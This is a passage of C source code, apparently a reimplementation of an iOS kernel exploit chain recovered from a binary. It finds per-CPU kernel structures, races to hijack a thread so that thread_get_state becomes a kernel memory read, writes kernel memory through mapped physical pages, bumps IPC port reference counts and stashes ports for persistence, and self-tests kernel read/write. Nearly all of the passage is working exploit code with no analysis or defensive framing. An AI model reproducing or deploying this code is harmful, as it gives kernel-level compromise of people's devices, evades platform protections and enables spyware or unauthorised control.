        if ((w0 & 0xFFFFFF00) == 0xF9000200) {
            if (kern_read32(a + 4) == 0xAA1303E1) {
                pat2_addr = a;
                kwlog("[locate] pattern 2 at 0x%llx\n",
                        (unsigned long long)pat2_addr);
                break;
            }
        }
    }
    if (!pat2_addr) {
        kwlog("[locate] pattern 2 not found\n");
        return -7;
    }

    uint32_t pat2_m8 = kern_read32(pat2_addr - 8);
    uint32_t pat2_m4 = kern_read32(pat2_addr - 4);
    kwlog("[locate] pat2-8: 0x%08x  pat2-4: 0x%08x\n", pat2_m8, pat2_m4);
    uint64_t percpu_ref = resolve_adrp_ref(pat2_addr - 8);
    if (!percpu_ref) {
        kwlog("[locate] percpu ref resolution failed\n");
        return -8;
    }

    uint64_t percpu_raw = 0;
    kwrite_kread64(percpu_ref, &percpu_raw);
    kwlog("[locate] percpu_ref=0x%llx raw=0x%llx\n",
            (unsigned long long)percpu_ref, (unsigned long long)percpu_raw);

    uint64_t kc_base2 = kt - 0x32997D0;
    uint64_t percpu_sec_va = 0;
    uint64_t percpu_sec_size = 0;

    uint64_t kern_mh = 0;
    for (uint64_t off = 0; off <= 0x10000; off += 0x4000) {
        if (kern_read32(kc_base2 + off) == 0xFEEDFACF) {
            uint32_t ft = kern_read32(kc_base2 + off + 12);
            kwlog("[locate] MH at KC+0x%llx: type=%u\n",
                    (unsigned long long)off, ft);
            if (ft == 2) { kern_mh = kc_base2 + off; break; }
        }
    }
    if (!kern_mh) kern_mh = kc_base2;

    uint32_t mh_magic = kern_read32(kern_mh);
    uint32_t mh_ncmds = kern_read32(kern_mh + 16);
    kwlog("[locate] kernel MH at 0x%llx: magic=0x%x ncmds=%u\n",
            (unsigned long long)kern_mh, mh_magic, mh_ncmds);

    if (mh_magic == 0xFEEDFACF) {
        uint64_t cmd_off = kern_mh + 32;
        for (uint32_t i = 0; i < mh_ncmds && i < 300; i++) {
            uint32_t cmd = kern_read32(cmd_off);
            uint32_t cmdsize = kern_read32(cmd_off + 4);
            if (cmdsize < 8 || cmdsize > 0x100000) break;
            if (cmd == 0x19) {
                uint32_t n0 = kern_read32(cmd_off + 8);
                uint32_t n4 = kern_read32(cmd_off + 12);
                if (n0 == 0x41445F5F && (n4 & 0xFFFF) == 0x4154) {
                    uint64_t seg_va = 0;
                    kwrite_kread64(cmd_off + 24, &seg_va);
                    uint32_t nsects = kern_read32(cmd_off + 64);
                    kwlog("[locate] __DATA at 0x%llx nsects=%u\n",
                            (unsigned long long)seg_va, nsects);
                    uint64_t sec_off = cmd_off + 72;
                    for (uint32_t s = 0; s < nsects && s < 32; s++) {
                        uint32_t sn0 = kern_read32(sec_off);
                        uint32_t sn4 = kern_read32(sec_off + 4);
                        if (s < 4)
                            kwlog("[locate]   sect[%u]: 0x%08x 0x%08x\n", s, sn0, sn4);
                        if (sn0 == 0x65705F5F && sn4 == 0x75706372) {
                            kwrite_kread64(sec_off + 32, &percpu_sec_va);
                            kwrite_kread64(sec_off + 40, &percpu_sec_size);
                            kwlog("[locate] __percpu: va=0x%llx size=0x%llx\n",
                                    (unsigned long long)percpu_sec_va,
                                    (unsigned long long)percpu_sec_size);
                            break;
                        }
                        sec_off += 80;
                    }
                    if (percpu_sec_va) break;
                }
            }
            cmd_off += cmdsize;
        }
    }

    uint64_t percpu_table = percpu_raw;
    if (percpu_sec_va && percpu_table < 0xFFFFFE0000000000ULL) {
        percpu_table = percpu_raw + percpu_sec_va;
        kwlog("[locate] percpu_table = 0x%llx + 0x%llx = 0x%llx\n",
                (unsigned long long)percpu_raw,
                (unsigned long long)percpu_sec_va,
                (unsigned long long)percpu_table);
    }

    if (percpu_table >= 0xFFFFFE0000000000ULL) {
        uint64_t percpu_pa_val = kva_to_pa(percpu_table);
        kwlog("[locate] kva_to_pa(percpu_table) = 0x%llx\n",
                (unsigned long long)percpu_pa_val);
        if (percpu_pa_val) {
            uint32_t stride = ((uint32_t)(page_mask + 1) +
                    (uint32_t)(percpu_sec_size & 0xFFFFFFFF)) & ~(uint32_t)page_mask;
            g_percpu_pa = percpu_pa_val;
            g_percpu_stride = stride;
            kwlog("[locate] percpu: pa=0x%llx stride=%u\n",
                    (unsigned long long)g_percpu_pa, g_percpu_stride);
        }
    }

    return 0;
}

#pragma mark - ppl_race_thread_hijack (binary 0x27808)

static void *hijack_worker_thread(void *arg) {
    semaphore_t sem = (semaphore_t)(uintptr_t)arg;
    semaphore_wait(sem);
    return NULL;
}

#define THREAD_HIJACK_OFFSET 184

static mach_port_t g_hijack_thread_port;
static vm_address_t g_hijack_mapped_addr;
static uint64_t g_hijack_pa;
static uint64_t *g_hijack_kfunc_ptr;
static semaphore_t g_hijack_semaphore;
static pthread_t g_hijack_worker;

typedef struct {
    uint64_t ctx_ptr;
    uint64_t *percpu_arr;
    uint32_t ncpu;
    uint32_t v20;
    uint64_t prev_page;
    pthread_mutex_t mtx;
    uint32_t v10;
    pthread_t found_thread;
    uint32_t ready_count;
    uint32_t max_threads;
    uint64_t *thread_arr;
    semaphore_t sem;
    mach_port_t entry_port;
    uint64_t page_mask;
    uint64_t dm_pa;
    uint32_t dm_size;
    vm_address_t dm_mapped;
    vm_size_t dm_map_size;
    uint64_t found_kva;
    uint64_t found_offset;
} worker_ctx_t;

static int get_cpu_number(void) {
    uint64_t tpidr;
    __asm__ volatile("mrs %0, TPIDR_EL0" : "=r"(tpidr));
    return (int)(tpidr & 0xFFF);
}

static void *ppl_worker_thread_func(void *arg) {
    worker_ctx_t *wctx = (worker_ctx_t *)arg;

    uint32_t attempts = 0;
    int locked = 0;
    int found_it = 0;

    while (!wctx->found_thread && attempts < 256) {
        if (locked) pthread_mutex_unlock(&wctx->mtx);
        thread_switch(0, 2, 1);
        if (pthread_mutex_lock(&wctx->mtx)) break;
        locked = 1;

        if (wctx->found_thread) break;

        int cpu = get_cpu_number();
        if ((uint32_t)cpu >= wctx->ncpu) { attempts++; continue; }

        uint64_t *entry = (uint64_t *)wctx->percpu_arr[cpu];
        if (!entry) { attempts++; continue; }

        uint64_t active_thread = *(uint64_t *)((char *)entry + wctx->v20);
        if (active_thread < 0xFFFFFE0000000000ULL || active_thread == 0) {
            attempts++;
            continue;
        }

        if (get_cpu_number() != cpu) { attempts++; continue; }

        uint64_t target = active_thread + wctx->v10;
        uint64_t target_page = target & ~wctx->page_mask;

        if (wctx->prev_page && target_page == wctx->prev_page)
            break;

        vm_address_t dm_mapped = wctx->dm_mapped;
        uint32_t dm_size = wctx->dm_size;
        if (!dm_mapped) {
            kern_return_t kr = map_kernel_memory_entry(wctx->entry_port,
                    &dm_mapped, dm_size, wctx->dm_pa);
            if (kr) { wctx->prev_page = target_page; break; }
            wctx->dm_mapped = dm_mapped;
            wctx->dm_map_size = dm_size;
        }

        int found_entry = 0;
        uint64_t entry_offset = 0;
        int logged = 0;
        for (uint64_t off = 0; off < dm_size; off += 48) {
            uint32_t e_mark = *(uint32_t *)(dm_mapped + off + 32);
            if (!e_mark) continue;
            uint64_t e_page = *(uint64_t *)(dm_mapped + off + 24);
            if (logged < 3) {
                kwlog("[worker] dm[%llu]: page=0x%llx mark=%u (want 0x%llx)\n",
                        (unsigned long long)(off/48),
                        (unsigned long long)e_page, e_mark,
                        (unsigned long long)target_page);
                logged++;
            }
            if (e_page == target_page) {
                entry_offset = off;
                found_entry = 1;
                kwlog("[worker] MATCH at entry %llu off=0x%llx\n",
                        (unsigned long long)(off/48), (unsigned long long)off);
                break;
            }
        }

        if (!found_entry) {
            wctx->prev_page = target_page;
            break;
        }

        uint64_t page_size = wctx->page_mask + 1;
        uint64_t dm_pages = (wctx->dm_pa + dm_size + page_size - 1) & ~wctx->page_mask;
        uint32_t page_shift = __builtin_ctz((uint32_t)page_size);
        uint64_t v21 = (wctx->page_mask & target) +
                ((dm_pages >> page_shift) + entry_offset / 48) * page_size;

        wctx->found_thread = pthread_self();
        wctx->found_kva = active_thread;
        wctx->found_offset = v21;
        wctx->prev_page = target_page;
        found_it = 1;
        break;
    }

    __sync_fetch_and_add(&wctx->ready_count, 1);
    if (locked) pthread_mutex_unlock(&wctx->mtx);

    if (found_it)
        semaphore_wait(wctx->sem);
    return NULL;
}

int ppl_race_thread_hijack(mach_port_t entry_port) {
    kwlog("[hijack] === PPL_RACE_THREAD_HIJACK START ===\n");

    uint64_t page_mask = kwrite_get_page_mask();
    if (!page_mask) { kwlog("[hijack] FAIL: no page_mask\n"); return -1; }

    int loc_ret = locate_developer_mode_fields_impl(entry_port);
    kwlog("[hijack] locate_dev_mode: %d percpu_pa=0x%llx\n",
            loc_ret, (unsigned long long)g_percpu_pa);
    if (!g_percpu_pa || !g_percpu_stride) {
        kwlog("[hijack] FAIL: no per-CPU data\n");
        return -2;
    }

    int ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu < 1) ncpu = 6;
    kwlog("[hijack] ncpu=%d stride=%u\n", ncpu, g_percpu_stride);

    vm_size_t percpu_map_size = (uint64_t)g_percpu_stride * (ncpu - 1);
    vm_address_t percpu_mapped = 0;
    kern_return_t kr = map_kernel_memory_entry(entry_port, &percpu_mapped,
            percpu_map_size, g_percpu_pa);
    if (kr) {
        kwlog("[hijack] FAIL: map per-CPU data 0x%x\n", kr);
        return -3;
    }
    kwlog("[hijack] per-CPU mapped at 0x%llx size=0x%llx\n",
            (unsigned long long)percpu_mapped, (unsigned long long)percpu_map_size);

    uint32_t v21 = 17904;
    uint64_t *percpu_arr = (uint64_t *)calloc(ncpu, sizeof(uint64_t));
    if (!percpu_arr) {
        vm_deallocate(mach_task_self_, percpu_mapped, percpu_map_size);
        return -4;
    }

    for (int i = 0; i < ncpu - 1; i++) {
        uint8_t *entry_ptr = (uint8_t *)percpu_mapped + v21 + (uint64_t)i * g_percpu_stride;
        uint16_t cpu_idx = *(uint16_t *)entry_ptr;
        if (cpu_idx < ncpu) {
            percpu_arr[cpu_idx] = (uint64_t)entry_ptr;
            kwlog("[hijack] percpu[%d] at offset 0x%llx\n",
                    cpu_idx, (unsigned long long)((uint8_t *)entry_ptr - (uint8_t *)percpu_mapped));
        }
    }

    worker_ctx_t wctx = {0};
    wctx.percpu_arr = percpu_arr;
    wctx.ncpu = ncpu;
    wctx.v20 = 40;
    wctx.v10 = THREAD_HIJACK_OFFSET;
    wctx.page_mask = page_mask;
    wctx.entry_port = entry_port;
    pthread_mutex_init(&wctx.mtx, NULL);

    wctx.dm_pa = g_dev_mode_pa;
    wctx.dm_size = g_dev_mode_off;

    kr = semaphore_create(mach_task_self_, &wctx.sem, 0, 0);
    if (kr) {
        free(percpu_arr);
        vm_deallocate(mach_task_self_, percpu_mapped, percpu_map_size);
        return -5;
    }

    int nworkers = ncpu * 2;
    if (nworkers < 8) nworkers = 8;
    wctx.max_threads = nworkers;
    wctx.thread_arr = (uint64_t *)calloc(nworkers, sizeof(uint64_t));

    kwlog("[hijack] spawning %d workers...\n", nworkers);
    for (int i = 0; i < nworkers; i++) {
        pthread_t t;
        if (pthread_create(&t, NULL, ppl_worker_thread_func, &wctx) == 0)
            wctx.thread_arr[i] = (uint64_t)t;
    }

    while (wctx.ready_count < (uint32_t)nworkers && !wctx.found_thread)
        thread_switch(0, 2, 1);

    kwlog("[hijack] workers done. found_thread=%p found_kva=0x%llx\n",
            (void *)wctx.found_thread, (unsigned long long)wctx.found_kva);

    for (int i = 0; i < nworkers; i++) {
        pthread_t t = (pthread_t)wctx.thread_arr[i];
        if (t && t != wctx.found_thread)
            pthread_join(t, NULL);
    }

    if (!wctx.found_thread || !wctx.found_kva) {
        kwlog("[hijack] FAIL: no running thread found\n");
        goto cleanup_workers;
    }

    kwlog("[hijack] found_kva=0x%llx found_offset=0x%llx\n",
            (unsigned long long)wctx.found_kva,
            (unsigned long long)wctx.found_offset);

    {
    vm_address_t thread_mapped = 0;
    kr = map_kernel_memory_entry(entry_port, &thread_mapped,
            vm_page_size, wctx.found_offset);
    if (kr) {
        kwlog("[hijack] FAIL: map via found_offset 0x%x\n", kr);
        goto cleanup_workers;
    }

    uint64_t *kfunc = (uint64_t *)((page_mask & wctx.found_offset) + thread_mapped);
    uint64_t kval = *kfunc;
    kwlog("[hijack] thread+%d = 0x%llx\n", THREAD_HIJACK_OFFSET, (unsigned long long)kval);

    if (kval < 0xFFFFFE0000000000ULL || kval == 0) {
        kwlog("[hijack] FAIL: thread+%d not valid kptr (0x%llx)\n",
                THREAD_HIJACK_OFFSET, (unsigned long long)kval);
        vm_deallocate(mach_task_self_, thread_mapped, vm_page_size);
        goto cleanup_workers;
    }

    mach_port_t found_port = pthread_mach_thread_np(wctx.found_thread);
    g_hijack_thread_port = found_port;
    g_hijack_mapped_addr = thread_mapped;
    g_hijack_pa = wctx.found_offset;
    g_hijack_kfunc_ptr = kfunc;
    g_hijack_semaphore = wctx.sem;
    g_hijack_worker = wctx.found_thread;

    free(wctx.thread_arr);
    pthread_mutex_destroy(&wctx.mtx);
    free(percpu_arr);
    if (wctx.dm_mapped)
        vm_deallocate(mach_task_self_, wctx.dm_mapped, wctx.dm_map_size);
    vm_deallocate(mach_task_self_, percpu_mapped, percpu_map_size);

    kwlog("[hijack] === PPL_RACE_THREAD_HIJACK COMPLETE (thread+256=0x%llx) ===\n",
            (unsigned long long)kval);
    return 0;
    }

cleanup_workers:
    semaphore_signal(wctx.sem);
    for (int i = 0; i < nworkers; i++) {
        pthread_t t = (pthread_t)wctx.thread_arr[i];
        if (t == wctx.found_thread) pthread_join(t, NULL);
    }
    free(wctx.thread_arr);
    pthread_mutex_destroy(&wctx.mtx);
    semaphore_destroy(mach_task_self_, wctx.sem);
    free(percpu_arr);
    if (wctx.dm_mapped)
        vm_deallocate(mach_task_self_, wctx.dm_mapped, wctx.dm_map_size);
    vm_deallocate(mach_task_self_, percpu_mapped, percpu_map_size);
    return -6;
}

#pragma mark - kread_via_thread_state (binary 0x296E8)

kern_return_t kread_via_thread_state_impl(uint64_t kaddr, void *out,
        uint32_t size) {
    if (!g_hijack_kfunc_ptr || !g_hijack_thread_port) return KERN_FAILURE;
    if (!size) return KERN_SUCCESS;

    uint64_t page_mask = kwrite_get_page_mask();
    uint32_t page_align = (uint32_t)(page_mask + 1);

    uint64_t bytes_read = 0;
    while (bytes_read < size) {
        uint64_t cur = kaddr + bytes_read;
        uint64_t remaining = size - bytes_read;

        uint64_t pg_off = page_mask & cur;
        uint64_t pg_base = cur & ~page_mask;

        if (pg_off >= page_align - 528)
            pg_off = page_align - 528;
        uint64_t adjusted = pg_off + pg_base;

        uint64_t saved = *g_hijack_kfunc_ptr;
        __asm__ volatile("dsb ish" ::: "memory");

        *g_hijack_kfunc_ptr = adjusted - 16;

        mach_msg_type_number_t state_count = 132;
        uint32_t state[132];
        kern_return_t kr = thread_get_state(g_hijack_thread_port, 17,
                (thread_state_t)state, &state_count);

        *g_hijack_kfunc_ptr = saved;

        if (kr) {
            kwlog("[tskread] thread_get_state FAILED: 0x%x\n", kr);
            return kr;
        }
        if (state_count != 132) {
            kwlog("[tskread] unexpected state_count: %u\n", state_count);
            return KERN_FAILURE;
        }

        size_t chunk = adjusted - cur + 528;
        if (chunk > remaining) chunk = remaining;
        memcpy((uint8_t *)out + bytes_read,
                (char *)state + (cur - adjusted), chunk);
        bytes_read += chunk;
    }
    return KERN_SUCCESS;
}

#pragma mark - Entry-port-mapped kwrite/kread helpers

static int kwrite32_mapped(mach_port_t entry_port, uint64_t kaddr, uint32_t value) {
    uint64_t page_mask = kwrite_get_page_mask();
    uint64_t pa = kva_to_pa(kaddr);
    if (!pa) return -1;
    vm_address_t mapped = 0;
    kern_return_t kr = map_kernel_memory_entry(entry_port, &mapped, vm_page_size, pa);
    if (kr) return kr;
    *(uint32_t *)(mapped + (pa & page_mask)) = value;
    vm_deallocate(mach_task_self_, mapped, vm_page_size);
    return 0;
}

static uint32_t kread32_ts(uint64_t kaddr) {
    uint64_t val = 0;
    kread_via_thread_state_impl(kaddr & ~7ULL, &val, 8);
    if (kaddr & 4) return (uint32_t)(val >> 32);
    return (uint32_t)val;
}

#pragma mark - Post-init setup

static uint64_t g_host_port_kva;
static uint64_t g_kern_task_ptr;

int post_init_setup(mach_port_t entry_port) {
    kwlog("[setup] === POST_INIT_SETUP ===\n");

    mach_port_t host = mach_host_self();
    uint64_t host_kva = resolve_port_to_ipc_port(host);
    mach_port_deallocate(mach_task_self_, host);
    if (!host_kva) { kwlog("[setup] FAIL: host port resolution\n"); return -1; }
    g_host_port_kva = host_kva;
    kwlog("[setup] host port KVA = 0x%llx\n", (unsigned long long)host_kva);

    uint32_t port_type_raw = kread32_ts(host_kva);
    uint32_t port_type = port_type_raw & 0x3FF;
    kwlog("[setup] host port type = %u (raw=0x%x)\n", port_type, port_type_raw);
    if (port_type < 3 || port_type > 4) {
        kwlog("[setup] FAIL: host port type not 3 or 4\n");
        return -2;
    }

    g_kern_task_ptr = kwrite_get_kern_task_kva();
    kwlog("[setup] kern_task_kva = 0x%llx\n", (unsigned long long)g_kern_task_ptr);
    if (!g_kern_task_ptr) { kwlog("[setup] FAIL: no kern_task\n"); return -3; }

    uint64_t kt_test = 0;
    kwrite_kread64(g_kern_task_ptr, &kt_test);
    kwlog("[setup] kern_task[0] = 0x%llx\n", (unsigned long long)kt_test);

    kwlog("[setup] === POST_INIT_SETUP COMPLETE ===\n");
    return 0;
}

typedef struct { uint64_t ipc_port_kva; int bumped4; int bumped128; } stab_ioref_t;
static stab_ioref_t g_stab_iorefs[2];
static int g_stab_ioref_cnt = 0;

#pragma mark - setup_dual_channels (binary sub_35E8C)

static int setup_dual_channels_impl(mach_port_t entry_port, uint64_t ipc_port_kva) {
    kern_return_t kr = 0;
    int bumped4 = 0, bumped128 = 0;

    uint32_t ref4 = kread32_ts(ipc_port_kva + 4);
    if (ref4 > 0x80000000u) {
        kwlog("[dch] +4 refcount sentinel (0x%x), skip bump\n", ref4);
    } else {
        kr = kwrite32_mapped(entry_port, ipc_port_kva + 4, ref4 + 1);
        kwlog("[dch] port+4: %u -> %u (kr=%d)\n", ref4, ref4 + 1, kr);
        if (!kr) bumped4 = 1;
    }

    if (!kr) {
        uint32_t ref128 = kread32_ts(ipc_port_kva + 128);
        if (ref128 > 0x80000000u) {
            kwlog("[dch] +128 sentinel (0x%x), skip bump\n", ref128);
        } else {
            kr = kwrite32_mapped(entry_port, ipc_port_kva + 128, ref128 + 1);
            kwlog("[dch] port+128: %u -> %u (kr=%d)\n", ref128, ref128 + 1, kr);
            if (!kr) bumped128 = 1;
        }
    }

    if (g_stab_ioref_cnt < 2) {
        g_stab_iorefs[g_stab_ioref_cnt].ipc_port_kva = ipc_port_kva;
        g_stab_iorefs[g_stab_ioref_cnt].bumped4 = bumped4;
        g_stab_iorefs[g_stab_ioref_cnt].bumped128 = bumped128;
        g_stab_ioref_cnt++;
    }
    return kr ? (int)kr : 0;
}

#pragma mark - init_transport_channel (binary sub_281F0)

static int init_transport_channel_impl(void) {
    kwlog("[itc] worker[112] unset -> transport channel skipped\n");
    return 0;
}

#pragma mark - Port persistence (binary sub_1D4A0)

int port_persistence_setup(mach_port_t entry_port) {
    kwlog("[port_persist] === PORT PERSISTENCE START ===\n");

    struct { uint64_t addr; uint64_t size; int32_t fmt; } di = {0};
    mach_msg_type_number_t dc = 5;
    kern_return_t kr = task_info(mach_task_self_, 17, (task_info_t)&di, &dc);
    if (kr || !di.addr) { kwlog("[port_persist] FAIL: task_info DYLD\n"); return -1; }
    uint32_t *slot0_ptr = (uint32_t *)(di.addr + 256);
    if (*slot0_ptr + 1 > 1) {
        kwlog("[port_persist] slot0 already set (0x%x) -> port persistence already done this launch\n", *slot0_ptr);
        return 1;
    }

    if (!g_hijack_thread_port || !g_hijack_pa || !entry_port) {
        kwlog("[port_persist] FAIL: missing prerequisites\n"); return -1;
    }

    mach_port_t ports[2];
    ports[0] = entry_port;

    if (!g_dev_mode_pa || !g_percpu_pa || !g_percpu_stride) {
        kwlog("[port_persist] running locate_developer_mode_fields...\n");
        int loc = locate_developer_mode_fields_impl(entry_port);
        if (loc) { kwlog("[port_persist] FAIL: locate_dev_mode %d\n", loc); return -2; }
    }

    if (!g_kern_task_ptr || !g_dev_mode_pa || !g_dev_mode_off ||
        !g_percpu_pa || !g_percpu_stride) {
        kwlog("[port_persist] FAIL: missing fields (kt=%d dm=%d pc=%d)\n",
                g_kern_task_ptr != 0, g_dev_mode_pa != 0, g_percpu_pa != 0);
        return -3;
    }

    vm_size_t page_size = vm_page_size;
    vm_size_t mem_size = page_size;
    mem_entry_name_port_t shared_entry = 0;
    kr = mach_make_memory_entry(mach_task_self_, &mem_size,
            0, VM_PROT_READ | VM_PROT_WRITE | 0x20000, &shared_entry, 0);
    if (kr) { kwlog("[port_persist] FAIL: mach_make_memory_entry 0x%x\n", kr); return -4; }
    ports[1] = shared_entry;

    vm_address_t shared_addr = 0;
    kr = vm_map(mach_task_self_, &shared_addr, page_size, 0, VM_FLAGS_ANYWHERE,
            shared_entry, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_COPY);
    if (kr) { kwlog("[port_persist] FAIL: vm_map shared 0x%x\n", kr); return -5; }

    bzero((void *)shared_addr, page_size);
    uint64_t *sp = (uint64_t *)shared_addr;
    sp[0] = g_kern_task_ptr;
    sp[4] = 0;
    sp[5] = 0;
    sp[6] = g_dev_mode_pa;
    sp[7] = (uint64_t)g_dev_mode_off;
    sp[8] = g_percpu_pa;
    sp[9] = (uint64_t)g_percpu_stride;
    kwlog("[port_persist] shared page: kt=0x%llx dm=0x%llx pc=0x%llx\n",
            (unsigned long long)sp[0], (unsigned long long)sp[6],
            (unsigned long long)sp[8]);

    vm_deallocate(mach_task_self_, shared_addr, page_size);

    uint64_t aii = di.addr;
    kwlog("[port_persist] all_image_info = 0x%llx\n", (unsigned long long)aii);
    uint32_t *slot0 = (uint32_t *)(aii + 256);
    uint32_t *slot1 = (uint32_t *)(aii + 260);

    for (int iter = 0; iter < 2; iter++) {
        mach_port_t port = ports[iter];
        kwlog("[port_persist] iter %d: port=0x%x\n", iter, port);

        uint64_t ipc_port_kva = resolve_port_to_ipc_port(port);
        if (!ipc_port_kva) {
            kwlog("[port_persist] FAIL: resolve port %d\n", iter);
            return -7;
        }
        kwlog("[port_persist] ipc_port KVA = 0x%llx\n", (unsigned long long)ipc_port_kva);

        int dch_kr = setup_dual_channels_impl(entry_port, ipc_port_kva);
        if (dch_kr) {
            kwlog("[port_persist] setup_dual_channels iter %d FAIL: 0x%x\n", iter, dch_kr);
            return -8;
        }

        kr = mach_port_mod_refs(mach_task_self_, port, MACH_PORT_RIGHT_SEND, 0xFFFF);
        if (kr) kwlog("[port_persist] WARN: port_mod_refs 0x%x\n", kr);

        if (iter == 0) {
            *slot0 = port;
            kwlog("[port_persist] wrote port 0x%x to slot0 at 0x%llx\n",
                    port, (unsigned long long)(uint64_t)slot0);
        } else {
            *slot1 = port;
            kwlog("[port_persist] wrote port 0x%x to slot1 at 0x%llx\n",
                    port, (unsigned long long)(uint64_t)slot1);
        }
    }

    (void)init_transport_channel_impl();

    kwlog("[port_persist] === PORT PERSISTENCE COMPLETE ===\n");
    return 0;
}

#pragma mark - Kernel data R/W verification

int kernel_rw_verify(mach_port_t entry_port) {
    kwlog("[rwcheck] === KERNEL R/W SELF-TEST ===\n");
    uint64_t page_mask = kwrite_get_page_mask();

    uint64_t proc_kva = kread_get_our_proc();
    if (!proc_kva) { kwlog("[rwcheck] FAIL: no proc\n"); return -1; }

    uint64_t proc_pa = kva_to_pa(proc_kva);
    if (!proc_pa) { kwlog("[rwcheck] FAIL: no proc PA\n"); return -2; }

    vm_address_t data_map = 0;
    kern_return_t kr = map_kernel_memory_entry(entry_port, &data_map,
            vm_page_size, proc_pa);
    if (kr) { kwlog("[rwcheck] FAIL: map DATA page 0x%x\n", kr); return -3; }

    uint64_t via_map = *(uint64_t *)(data_map + (proc_pa & page_mask));
    vm_deallocate(mach_task_self_, data_map, vm_page_size);

    uint64_t via_kread = 0;
    kwrite_kread64(proc_kva, &via_kread);

    kwlog("[rwcheck] DATA page: map=0x%llx kread=0x%llx match=%d\n",
            (unsigned long long)via_map, (unsigned long long)via_kread,
            via_map == via_kread);

    vm_address_t write_map = 0;
    kr = map_kernel_memory_entry(entry_port, &write_map, vm_page_size, proc_pa);
    if (kr) {
        kwlog("[rwcheck] FAIL: map for write test 0x%x\n", kr);
        goto done;
    }
    uint64_t *write_ptr = (uint64_t *)(write_map + (proc_pa & page_mask));
    uint64_t original = *write_ptr;
    uint64_t test_val = original ^ 0x4141414141414141ULL;
    *write_ptr = test_val;
    uint64_t readback = 0;
    kwrite_kread64(proc_kva, &readback);
    *write_ptr = original;
    vm_deallocate(mach_task_self_, write_map, vm_page_size);

    kwlog("[rwcheck] WRITE test: orig=0x%llx wrote=0x%llx readback=0x%llx restored\n",
            (unsigned long long)original, (unsigned long long)test_val,
            (unsigned long long)readback);
    if (readback == test_val)
        kwlog("[rwcheck] === kernel data write OK ===\n");

done:
    kwlog("[rwcheck] === SELF-TEST COMPLETE ===\n");
    return 0;
}

#pragma mark - init_kernel_rw_primitives (binary 0x288D4)

typedef struct krw_worker_state {
    uint64_t thread_kva;
    uint64_t thread_pa;
    uint64_t mapped_base;
    uint64_t map_size;
    uint64_t mapped_thread;
    uint64_t pthread_val;
    uint32_t mach_port;
    uint32_t ulock_word;
    uint32_t displacement;
    uint32_t _pad60;
    uint64_t counter;
    uint8_t exit_flag;
    uint8_t ready_flag;
    uint8_t path_flag;
    uint8_t _pad75[45];
} krw_worker_state_t;

krw_worker_state_t *g_krw_state = NULL;
static mach_port_t g_sptm_entry_port = 0;

static void *krw_worker_func(void *arg) {
    krw_worker_state_t *ws = (krw_worker_state_t *)arg;
    (void)__error();
    uint32_t eintr_count = 0;
    ws->ready_flag = 1;
    while (1) {
        int ret = __ulock_wait(0x10001, &ws->ulock_word, 0, ws->ulock_word);
        if (ret == 0) {
            ++ws->counter;
            eintr_count = 0;
            if (ws->exit_flag) return NULL;
            continue;
        }
        if (ret == -1 && *__error() == EINTR && eintr_count++ < 100)
            continue;
        if (*__error() != EFAULT)
            return NULL;
        eintr_count = 0;
        if (ws->exit_flag) return NULL;
    }
}

static int find_kernel_text_section(uint64_t kern_mh, uint64_t *out_base, uint64_t *out_size) {
    uint32_t ncmds = kern_read32(kern_mh + 16);
    uint64_t cmd_off = kern_mh + 32;
    for (uint32_t i = 0; i < ncmds && i < 64; i++) {
        uint32_t cmd = kern_read32(cmd_off);
        uint32_t cmdsize = kern_read32(cmd_off + 4);
        if (cmdsize < 8 || cmdsize > 0x100000) break;
        if (cmd == 0x19) {
            uint32_t n0 = kern_read32(cmd_off + 8);
            uint32_t n4 = kern_read32(cmd_off + 12);
            uint32_t n8 = kern_read32(cmd_off + 16);
            if (n0 == 0x45545f5f && n4 == 0x455f5458 && n8 == 0x00434558) {
                uint32_t nsects = kern_read32(cmd_off + 64);
                uint64_t sec_off = cmd_off + 72;
                for (uint32_t s = 0; s < nsects && s < 16; s++) {
                    uint32_t sn0 = kern_read32(sec_off);
                    uint32_t sn4 = kern_read32(sec_off + 4);
                    if (sn0 == 0x65745f5f && sn4 == 0x00007478) {
                        kwrite_kread64(sec_off + 32, out_base);
                        kwrite_kread64(sec_off + 40, out_size);
                        return 0;
                    }
                    sec_off += 80;
                }
                break;
            }
        }
        cmd_off += cmdsize;
    }
    return -1;
}

static uint64_t scan_text_for_pattern(uint64_t text_base, uint64_t text_size,
        uint32_t pattern, int last_only) {
    uint64_t scan_start = last_only ? (text_base + text_size - 0x20000) : text_base;
    uint64_t scan_end = text_base + text_size;
    for (uint64_t addr = scan_start; addr < scan_end; addr += 4) {
        if (kern_read32(addr) == pattern)
            return addr;
    }
    return 0;
}

int init_kernel_rw_primitives(mach_port_t entry_port) {
    kwlog("[krw] === INIT_KERNEL_RW_PRIMITIVES ===\n");

    uint64_t kt_kva = kwrite_get_kern_task_kva();
    uint64_t page_mask = kwrite_get_page_mask();
    if (!kt_kva || !page_mask) { kwlog("[krw] FAIL: no kt or mask\n"); return -1; }

    krw_worker_state_t *ws = NULL;
    pthread_t worker = 0;
    mach_port_t worker_port = 0;
    uint64_t thread_kva = 0;

    for (int attempt = 0; attempt < 16; attempt++) {
        krw_worker_state_t *try_ws = (krw_worker_state_t *)calloc(1, 0x78);
        if (!try_ws) continue;

        pthread_t try_worker;
        if (pthread_create(&try_worker, NULL, krw_worker_func, try_ws)) {
            free(try_ws); continue;
        }
        mach_port_t try_port = pthread_mach_thread_np(try_worker);
        if (try_port + 1 < 2) {
            try_ws->exit_flag = 1; __ulock_wake(0x1, &try_ws->ulock_word, 0);
            pthread_join(try_worker, NULL); free(try_ws); continue;
        }
        try_ws->mach_port = try_port;

        int wc = 1002;
        while (!try_ws->ready_flag && --wc > 0) usleep(1000);
        if (!try_ws->ready_flag) {
            try_ws->exit_flag = 1; __ulock_wake(0x1, &try_ws->ulock_word, 0);
            pthread_join(try_worker, NULL); free(try_ws); continue;
        }

        uint64_t try_kva = resolve_thread_kva(try_port);
        if (!try_kva || ((try_kva + 1520) ^ try_kva) & ~page_mask) {
            kwlog("[krw] attempt %d: kva=0x%llx page check failed\n",
                    attempt, (unsigned long long)try_kva);
            try_ws->exit_flag = 1; __ulock_wake(0x1, &try_ws->ulock_word, 0);
            pthread_join(try_worker, NULL); free(try_ws); continue;
        }

        ws = try_ws;
        worker = try_worker;
        worker_port = try_port;
        thread_kva = try_kva;
        kwlog("[krw] attempt %d: worker thread kva = 0x%llx OK\n",
                attempt, (unsigned long long)thread_kva);
        break;
    }

    if (!ws) { kwlog("[krw] FAIL: no thread passed page check after 16 tries\n"); return -7; }

